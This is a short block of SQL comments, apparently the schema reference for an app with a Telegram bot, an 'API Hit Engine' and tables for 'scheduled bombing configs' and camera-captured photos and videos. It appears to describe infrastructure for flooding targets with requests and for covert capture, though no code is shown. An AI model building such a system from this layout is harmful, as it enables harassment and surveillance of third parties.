-- - Admin can toggle signup on/off from admin panel
-- - Admin can toggle login on/off from admin panel
-- - Admin password for Hit Engine stored in hit_site_settings
-- =====================================================

-- =====================================================
-- QUICK REFERENCE: Tables & Purpose
-- =====================================================
-- profiles          : User profiles (id linked to auth.users)
-- user_roles        : RBAC roles (admin/user), first signup = admin
-- access_passwords  : [LEGACY] Credit-based login passwords
-- user_sessions     : [LEGACY] Session tracking
-- credit_usage      : [LEGACY] Credit deduction logs
-- app_settings      : Global config (JSON key-value store)
--   - main_settings      : All admin settings
--   - hit_site_settings  : Hit Engine labels
--   - signup_enabled     : Toggle signup on/off
--   - login_enabled      : Toggle login on/off
--   - tgbot_config       : Bot defaults
--   - tgbot_admin_ids    : Bot admin user IDs
--   - tgbot_cf_workers   : CF Worker URLs
--   - tgbot_premium_users: Premium plans
--   - tgbot_global_stats : Global counters
--   - tgbot_all_users    : All bot user IDs
--   - tgbot_access_keys  : Access key passwords
--   - tgbot_state_{chatId}: Per-user bot state
--   - tgbot_usage_{chatId}: Per-user usage
--   - fast_api_secret_key : fast-hit-all auth
-- captured_photos   : Camera capture data
-- captured_videos   : Video capture URLs
-- search_history    : Search query logs
-- hit_apis          : API Hit Engine configs (realtime enabled)
-- scheduled_hits    : Scheduled bombing configs (pg_cron)
-- =====================================================
